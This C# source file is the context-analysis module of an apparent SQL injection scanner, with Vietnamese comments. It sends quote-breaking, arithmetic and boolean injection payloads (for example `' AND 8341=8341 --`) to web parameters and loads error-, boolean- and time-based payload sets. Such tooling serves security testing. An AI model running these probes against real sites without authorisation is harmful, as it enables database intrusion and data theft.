using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using SQLiScanner.Models;
using SQLiScanner.Utilities;
using SQLiScanner.Utility;

namespace SQLiScanner.Modules
{
    public class ContextAnalyzer
    {
        private readonly HttpClient _client;
        private readonly string _boundariesXmlPath;
        private readonly string _errorBasedXmlPath;
        private readonly string _booleanBlindXmlPath;
        private readonly string _timeBlindXmlPath;

        public const string INT_PAYLOAD_1 = "1";
        public const string INT_PAYLOAD_2 = "1-1";
        public const string INT_PAYLOAD_3 = "2-1";

        public ContextAnalyzer(
            HttpClient httpClient,
            string boundariesXmlPath = "./Resources/boundaries.xml",
            string errorBasedXmlPath = "./Resources/error_based.xml",
            string booleanBlindXmlPath = "./Resources/boolean_blind.xml",
            string timeBlindXmlPath = "./Resources/time_blind.xml")
        {
            _client = httpClient;
            _boundariesXmlPath = boundariesXmlPath;
            _errorBasedXmlPath = errorBasedXmlPath;
            _booleanBlindXmlPath = booleanBlindXmlPath;
            _timeBlindXmlPath = timeBlindXmlPath;
        }

        public async Task<HeuristicResult> PerformHeuristicScanAsync(CrawlResult target, string paramName)
        {
            string originalValue = target.Params[paramName];
            var result = new HeuristicResult
            {
                DebugInfo = $"Đang dò tham số: {paramName}"
            };

            try
            {
                var (baseHtml, baseBytes, baseStatus) = await SendPayloadAsync(target, paramName, originalValue);
                if (baseBytes == null)
                {
                    result.Status = "FAILED";
                    result.DebugInfo += "\n[-] Không lấy được phản hồi Baseline. Dừng kiểm tra Heuristic.";
                    Logger.Warning("Không lấy được Baseline. Target có thể đã sập hoặc WAF chặn.");
                    return result; // Thoát sớm, an toàn tuyệt đối
                }

                Logger.Phase("[PHASE 1] KIỂM TRA NGỮ CẢNH ENTRY POINT HIỆN TẠI");
                Logger.Info("Kiểm tra ngữ cảnh integer...");

                // PHASE 1: Kiểm tra ngữ cảnh là INTEGER
                await Phase1_DetectIntegerContextAsync(target, paramName, result);

                if (result.DetectedType != "INTEGER")
                {
                    result.DebugInfo += "\n[Phase 2] Kiểm tra ngữ cảnh string thông qua Error-Based...";
                    Logger.Phase("[PHASE 2] KIỂM TRA NGỮ CẢNH STRING THÔNG QUA ERROR-BASED");

                    // PHASE 2: Kiểm tra liệu ngữ cảnh có phải là string-like
                    await Phase2_DetectStringContextAsync(
                        target, paramName, originalValue, baseStatus,
                        baseBytes.Length, baseHtml, result
                    );
                }


                if (result.ApplicableBoundaries.Count > 0)
                {
                    Logger.Phase("[PHASE 3] XÁC ĐỊNH PAYLOAD CHÍNH XÁC CHO NGỮ CẢNH ĐANG XÁC ĐỊNH");
                    // PHASE 3: Xác định ngữ cảnh
                    await Phase3_VerifyBoundaryAsync(
                        target, paramName, originalValue, baseStatus,
                        baseBytes.Length, baseHtml, result
                    );
                }
                else
                {
                    result.Status = "UNCERTAIN";
                    await LoadApplicablePayloadsAsync(result);
                }

                return result;
            }
            catch (Exception ex)
            {
                // Nếu xảy ra lỗi thì load toàn bộ boundary và payload
                Logger.Error($"Lỗi nghiêm trọng tại ContextAnalyzer: {ex.Message}");
                result.Status = "FAILED"; // Đánh dấu thất bại hoàn toàn
                result.DebugInfo += $"\n[!] Bị Catch Exception: {ex.Message}";

                result.ApplicableBoundaries = await GetAllApplicableBoundaries();
                await LoadApplicablePayloadsAsync(result);
                return result;
            }
        }

        private async Task<List<Boundary>> GetBoundariesByPType(int ptype)
        {
            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                var filtered = allBoundaries
                    .Where(b => b.PType == ptype)
                    .OrderBy(b => b.Level) // Sắp xếp theo Level
                    .ToList();

                return filtered;
            }
            catch
            {
                // Lấy Boundary cứng nếu như load fail
                return GetHardcodedBoundaries(ptype);
            }
        }

        private List<Boundary> GetHardcodedBoundaries(int ptype)
        {
            return ptype switch
            {
                1 => new() // INTEGER
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 1,
                        Prefix = "",
                        Suffix = "",
                        ContextName = "INTEGER"
                    }
                },

                2 => new() // STRING_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "--",
                        ContextName = "STRING_SINGLE_QUOTE"
                    },
                    new Boundary
                    {
                        Level = 1,
                        Clause = "1",
                        Where = "1",
                        PType = 2,
                        Prefix = "'",
                        Suffix = "AND '1'='1",
                        ContextName = "STRING_SINGLE_QUOTE_AND"
                    }
                },

                3 => new() // LIKE_SINGLE_QUOTE
                {
                    new Boundary
                    {
                        Level = 2,
                        Clause = "1",
                        Where = "1",
                        PType = 3,
                        Prefix = "%'",
                        Suffix = "AND '%'='",
                        ContextName = "LIKE_SINGLE_QUOTE"
                    }
                },

                _ => new() // Default: Empty
            };
        }

        private List<Boundary> GetNestedParenthesisBoundaries()
        {
            return new()
            {
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1, // Coi như numeric
                    Prefix = "')",
                    Suffix = "AND ('1'='1",
                    ContextName = "NESTED_PARENTHESIS"
                },
                new Boundary
                {
                    Level = 2,
                    Clause = "1",
                    Where = "1",
                    PType = 1,
                    Prefix = "')",
                    Suffix = "--",
                    ContextName = "NESTED_PARENTHESIS_COMMENT"
                }
            };
        }

        public async Task<List<PayloadTest>> LoadApplicablePayloads(int stype = 0)
        {
            var allPayloads = new List<PayloadTest>();

            try
            {
                // Load error-based payloads
                if (stype == 0 || stype == 2)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2));

                // Load boolean-based payloads
                if (stype == 0 || stype == 1)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1));

                // Load time-based payloads
                if (stype == 0 || stype == 5)
                    allPayloads.AddRange(await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5));

                return allPayloads.OrderBy(p => p.Level).ThenBy(p => p.Risk).ToList();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Warning] Không thể load payloads: {ex.Message}");
                return new List<PayloadTest>();
            }
        }

        private async Task<(string html, byte[] bytes, int statusCode)> SendPayloadAsync(
            CrawlResult target, string paramName, string payloadValue)
        {
            try
            {
                var checkParams = new Dictionary<string, string>(target.Params);
                checkParams[paramName] = payloadValue;

                var method = new HttpMethod(target.HttpMethod.ToUpper());
                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in checkParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());
                    Logger.Request(method.ToString(), request.RequestUri.ToString());
                }
                else // POST
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(checkParams);
                    Logger.Process($"[>] Đang gửi Form cùng các truòng dữ liệu đính kèm...");
                    Logger.Request(method.ToString(), string.Join(", ", checkParams.Select(kv => $"{kv.Key} = [{kv.Value}]")));
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
                var bytes = await response.Content.ReadAsByteArrayAsync();
                var charset = response.Content.Headers.ContentType?.CharSet;
                var encoding = charset is not null ? Encoding.GetEncoding(charset) : Encoding.UTF8;

                return (encoding.GetString(bytes), bytes, (int)response.StatusCode);
            }
            catch (Exception ex)
            {
                Logger.Error($"Gửi Request thất bại: {ex.Message}");
                return (null, null, 0);
            }
        }

        #region Các hàm phụ trợ
        private async Task Phase1_DetectIntegerContextAsync(CrawlResult target, string paramName, HeuristicResult result)
        {
            // Lấy base response
            Logger.Process("Kiểm tra tham số với giá trị = 1");
            result.DebugInfo += "\n[Phase 1] Đang thử kiểm tra ngữ cảnh Integer...";
            var (baselineHtml, baselineBytes, baselineStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_1);
            Logger.Response(baselineStatus, baselineBytes.Length);
            if (baselineBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                result.DebugInfo += "\n[-] Không nhận được baseline response. Vui lòng kiểm tra kết nối!";
                return;
            }

            int baselineLength = baselineBytes.Length;
            result.DebugInfo += $"\nBaseline: {baselineStatus} | Length: {baselineLength}";

            // Test payloa False
            Logger.Process("Kiểm tra tham số với giá trị = 1-1");
            var (falseHtml, falseBytes, flaseStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_2);
            Logger.Response(flaseStatus, falseBytes.Length);
            if (falseBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }

            // Test payload 3
            Logger.Process("Kiểm tra tham số với giá trị = 2-1");
            var (trueHtml, trueBytes, trueStatus) =
                await SendPayloadAsync(target, paramName, INT_PAYLOAD_3);
            Logger.Response(trueStatus, trueBytes.Length);
            if (trueBytes == null)
            {
                result.DetectedType = "UNKNOWN";
                result.ConfidenceScore = 0;
                return;
            }

            // Nếu cả base và payload 2 và 3 đều giống nhau thì tham số là Integer
            double similarityPayloadFalse = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                flaseStatus, falseBytes.Length, falseHtml);

            double similarityPayloadTrue = CalculateSimilarity(
                baselineStatus, baselineLength, baselineHtml,
                trueStatus, trueBytes.Length, trueHtml
            );

            result.Similarity = Math.Max(similarityPayloadFalse, similarityPayloadTrue);
            result.DebugInfo += $"\nPayload 1 vs 2 similarity: {similarityPayloadFalse:F2}%";
            result.DebugInfo += $"\nPayload 1 vs 3 similarity: {similarityPayloadTrue:F2}%";

            // Ngưỡng mức chấp nhận cho Integer (> 95% -> Integer)
            const double INTEGER_THRESHOLD = 0.95;
            // Nếu payload 2 - 1 (giống base = 1) trả về như base thì chắc chắn server thực hiện phép trừ và có thể kết luận ngữ cảnh là Integer
            if (similarityPayloadTrue > INTEGER_THRESHOLD && similarityPayloadFalse < INTEGER_THRESHOLD)
            {
                result.DetectedType = "INTEGER";
                result.ConfidenceScore = (int)Math.Min(100, (result.Similarity * 100));
                result.DebugInfo += $"\n[+] PHÁT HIỆN THAM SỐ LÀ INTEGER (ptype: 1)";
                result.DebugInfo += $"\nĐIỂM: {result.ConfidenceScore}%";

                Logger.Success($"\nPHÁT HIỆN: INTEGER (ĐIỂM: {result.ConfidenceScore}%)");

                result.ApplicableBoundaries = await GetBoundariesByPType(1);
                return;
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;
            result.DebugInfo += $"\n[-] Payload dành cho INTEGER gây lỗi (similarity {result.Similarity:F2}% < {INTEGER_THRESHOLD}%)";
            result.DebugInfo += "\n[-] Không tìm dấu hiệu biểu thị giá trị là dạng Integer";
            result.DebugInfo += "\n    Cần phải test ngữ cảnh string-like ở Phase 2";

            Logger.Warning($"Payload dành cho INTEGER gây lỗi (similarity {result.Similarity:F2}% < {INTEGER_THRESHOLD}%)");
            Logger.Warning("Không tìm thấy dấu hiệu là INTEGER - Cần phải kiểm tra ngữ cảnh STRING-LIKE Phase 2");
            return;
        }

        private async Task Phase2_DetectStringContextAsync(
            CrawlResult target,
            string paramName,
            string originalValue,
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            HeuristicResult result)
        {
            result.DebugInfo += "[PHASE 2] Đang thử kiểm tra ngữ cảnh string";
            Logger.Info("Kiểm tra ngữ cảnh integer...");

            const double STRING_LIKE_THRESHOLD = 0.90;

            var testPayloads = new[]
            {
                $"{originalValue}'",    // Single quote
                $"{originalValue}\"",   // Double quote
                $"{originalValue}%'",    // LIKE pattern single
                $"{originalValue}%\"",   // LIKE pattern double
                $"{originalValue}')"     // Nested parenthesis
            };

            foreach (var payload in testPayloads)
            {
                var (testHtml, testBytes, testStatus) =
                    await SendPayloadAsync(target, paramName, payload);

                if (testBytes == null)
                    continue;

                double similarity = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    testStatus, testBytes.Length, testHtml
                );

                result.DebugInfo += $"\nPayload [{payload}] Độ tương đồng: {similarity:F2}%";

                if (similarity < STRING_LIKE_THRESHOLD)
                {
                    result.DebugInfo += "\n  → Có sự thay đổi từ response chứa payload (có thể là STRING-LIKE, nhưng không chắc là dạng nào)";
                    result.DetectedType = "STRING_LIKE";
                    result.ConfidenceScore = (int)((1.0 - similarity) * 100);
                    result.Similarity = similarity * 100;

                    result.ApplicableBoundaries = await GetAllStringLikeBoundaries();

                    result.DebugInfo += $"\n[+] DỰ ĐOÁN THAM SỐ LÀ MỘT BIẾN CÓ GIÁ TRỊ STRING (Tự tin: {result.ConfidenceScore}%)";
                    result.DebugInfo += $"\n    Không biết rõ chính xác (single-quote/like pattern/nested)";
                    result.DebugInfo += $"\n    Cần xác minh ở Phase 3 (Boundary Testing)";
                    result.DebugInfo += $"\n    Boundaries thích hợp: {result.ApplicableBoundaries.Count}";

                    Logger.Success($"PHÁT HIỆN THAM SỐ LÀ DẠNG STRING-LIKE - ĐIỂM: {result.ConfidenceScore}%");

                    return;
                }
            }

            result.DetectedType = "UNCERTAIN";
            result.ConfidenceScore = 0;
            result.Similarity = 100;
            result.ApplicableBoundaries = await GetAllApplicableBoundaries();

            result.DebugInfo += "\n[-] Không tìm dấu hiệu biểu thị giá trị là dạng string";
            result.DebugInfo += "\n    Cần phải test toàn bộ boundaries ở Phase 3";

            Logger.Warning("Không tìm thấy dấu hiệu là string - Cần phải kiểm tra toàn bộ boundary ở Phase 3");

            return;
        }

        private async Task Phase3_VerifyBoundaryAsync(
            CrawlResult target,
            string paramName,
            string originalValue, // Cần giá trị gốc (VD: admin, 123)
            int baselineStatus,
            int baselineLength,
            string baselineHtml,
            HeuristicResult result)
        {
            result.DebugInfo += "\n\n[PHASE 3] BẮT ĐẦU XÁC MINH BOUNDARY CHÍNH XÁC...";
            Logger.Phase("XÁC MINH BOUNDARY BẰNG BOOLEAN LOGIC (PHASE 3)");

            const double SIMILARITY_THRESHOLD = 0.95;
            foreach (var boundary in result.ApplicableBoundaries)
            {
                string trueCondition = "8341=8341";
                string falseCondition = "8341=8342";

                string truePayload = $"{originalValue}{boundary.Prefix} AND {trueCondition} {boundary.Suffix} ";
                string falsePayload = $"{originalValue}{boundary.Prefix} AND {falseCondition} {boundary.Suffix} ";

                // TEST TRUE PAYLOAD (Kỳ vọng: Giống Base)
                var (htmlTrue, bytesTrue, statusTrue) = await SendPayloadAsync(target, paramName, truePayload);
                if (bytesTrue == null) continue;

                double simTrue = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusTrue, bytesTrue.Length, htmlTrue);

                // Nếu True payload mà làm giao diện sai lệch khác Base -> Boundary này sai Prefix/Suffix
                if (simTrue < SIMILARITY_THRESHOLD)
                {
                    continue;
                }

                // TEST FALSE PAYLOAD (Kỳ vọng: Khác Base)
                var (htmlFalse, bytesFalse, statusFalse) = await SendPayloadAsync(target, paramName, falsePayload);
                if (bytesFalse == null) continue;

                double simFalse = CalculateSimilarity(
                    baselineStatus, baselineLength, baselineHtml,
                    statusFalse, bytesFalse.Length, htmlFalse);

                result.DebugInfo += $"\n[Thử nghiệm] Boundary {boundary.ContextName}: True_Sim={simTrue * 100:F1}% | False_Sim={simFalse * 100:F1}%";
                if (simTrue >= SIMILARITY_THRESHOLD && simFalse < SIMILARITY_THRESHOLD)
                {
                    Logger.Success($"✓ Boundary works: {boundary.ContextName}");
                    result.LockedBoundary = boundary;
                    result.ApplicableBoundaries.Clear(); // Vì đã chốt hạ một boundary nên không cần list khác nứa
                    result.Status = "SUCCESS";

                    // Load payloads
                    await LoadApplicablePayloadsAsync(result);

                    return;
                }
            }

            result.Status = "UNCERTAIN";
            result.LockedBoundary = null;
            await LoadApplicablePayloadsAsync(result);
        }

        private async Task<List<Boundary>> GetAllStringLikeBoundaries()
        {
            try
            {
                var allBoundaries = await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);

                // Filter: Chỉ lấy string-like contexts
                var stringLikeBoundaries = allBoundaries
                    .Where(b => b.PType == 2 || b.PType == 3 || b.PType == 4 || b.PType == 5)  // Single quote, Single quote LIKE, double quote, Double quote LIKE
                    .ToList();

                // Lấy Nested context
                stringLikeBoundaries.AddRange(GetNestedParenthesisBoundaries());

                return stringLikeBoundaries
                    .OrderBy(b => b.Level)
                    .ThenBy(b => b.Clause)
                    .ToList();
            }
            catch
            {
                // Fallback
                var boundaries = new List<Boundary>();
                boundaries.AddRange(await GetBoundariesByPType(2));    // Single quote
                boundaries.AddRange(await GetBoundariesByPType(3));    // LIKE
                boundaries.AddRange(GetNestedParenthesisBoundaries()); // Nested
                return boundaries;
            }
        }

        private async Task LoadApplicablePayloadsAsync(HeuristicResult result)
        {
            try
            {
                // Load tất cả 3 loại payloads
                var errorPayloads = await PayloadLoader.LoadPayloadAsync(_errorBasedXmlPath, 2);
                var booleanPayloads = await PayloadLoader.LoadPayloadAsync(_booleanBlindXmlPath, 1);
                var timePayloads = await PayloadLoader.LoadPayloadAsync(_timeBlindXmlPath, 5);

                // Merge
                var allPayloads = new List<PayloadTest>();
                allPayloads.AddRange(errorPayloads);
                allPayloads.AddRange(booleanPayloads);
                allPayloads.AddRange(timePayloads);

                // Sort: Level (easy → hard) then Risk (low → high)
                result.ApplicablePayloads = allPayloads
                    .OrderBy(p => p.Level)
                    .ThenBy(p => p.Risk)
                    .ToList();

                result.DebugInfo += $"\nLoaded {result.ApplicablePayloads.Count} payloads:";
                result.DebugInfo += $"\n  - Error-based: {errorPayloads.Count}";
                result.DebugInfo += $"\n  - Boolean-based: {booleanPayloads.Count}";
                result.DebugInfo += $"\n  - Time-based: {timePayloads.Count}";

                Logger.Info($"Loaded {result.ApplicablePayloads.Count} payloads từ XML");
            }
            catch (Exception ex)
            {
                Logger.Warning($"Lỗi load payloads: {ex.Message}");
                result.DebugInfo += $"\n[-] Lỗi load payloads: {ex.Message}";
            }
        }
        private async Task<List<Boundary>> GetAllApplicableBoundaries()
        {
            try
            {
                return await PayloadLoader.LoadBoundariesAsync(_boundariesXmlPath);
            }
            catch
            {
                var all = new List<Boundary>();
                all.AddRange(await GetBoundariesByPType(1));
                all.AddRange(await GetBoundariesByPType(2));
                all.AddRange(await GetBoundariesByPType(3));
                return all;
            }
        }

        private double CalculateSimilarity(
            int status1, int length1, string html1,
            int status2, int length2, string html2,
            double tolerancePercent = 0.05)
        {
            // Lọc status code
            if (status1 != status2)
            {
                return 0.0;
            }

            // Lọc Content-Length
            if (length1 == length2 && html1 == html2)
                return 1.0;

            int maxLength = Math.Max(length1, length2);
            if (maxLength > 0)
            {
                double diffRatio = (double)Math.Abs(length1 - length2) / maxLength;

                if (diffRatio > tolerancePercent)
                {
                    return 0.0;
                }
            }

            // Lọc nội dung của Response
            string text1 = ExtractPlainText(html1);
            string text2 = ExtractPlainText(html2);

            return CalculateContentSimilarity(text1, text2);
        }

        private double CalculateContentSimilarity(string text1, string text2)
        {
            if (string.IsNullOrEmpty(text1) && string.IsNullOrEmpty(text2)) return 1.0;
            if (string.IsNullOrEmpty(text1) || string.IsNullOrEmpty(text2)) return 0.0;
            if (text1 == text2) return 1.0;
            char[] separator = new[] { ' ' };

            var set1 = new HashSet<string>(text1.Split(separator, StringSplitOptions.RemoveEmptyEntries));
            var set2 = new HashSet<string>(text2.Split(separator, StringSplitOptions.RemoveEmptyEntries));

            int intersectionCount = set1.Intersect(set2).Count();
            int unionCount = set1.Union(set2).Count();

            if (unionCount == 0) return 0.0;

            return (double)intersectionCount / unionCount;
        }

        private string ExtractPlainText(string html)
        {
            if (string.IsNullOrWhiteSpace(html)) return string.Empty;

            // Xóa toàn bộ nội dung trong thẻ script và style
            string result = Regex.Replace(html, @"<script[^>]*>[\s\S]*?</script>", string.Empty, RegexOptions.IgnoreCase);
            result = Regex.Replace(result, @"<style[^>]*>[\s\S]*?</style>", string.Empty, RegexOptions.IgnoreCase);

            // Xóa các comment
            result = Regex.Replace(result, @"<!--[\s\S]*?-->", string.Empty);

            // Xóa tát cả thẻ HTML (<div>, <a>, <img>)
            result = Regex.Replace(result, @"<[^>]+>", " ");

            // Giải mã các kí tự html (&nbsp, &amp, &lt) thành kí tự thật
            result = WebUtility.HtmlDecode(result);

            // Format lại các khoảng trắng/dòng thừa thành 1 khoảng trắng duy nhất
            result = Regex.Replace(result, @"\s+", " ").Trim();

            return result;
        }
        #endregion

    }
}
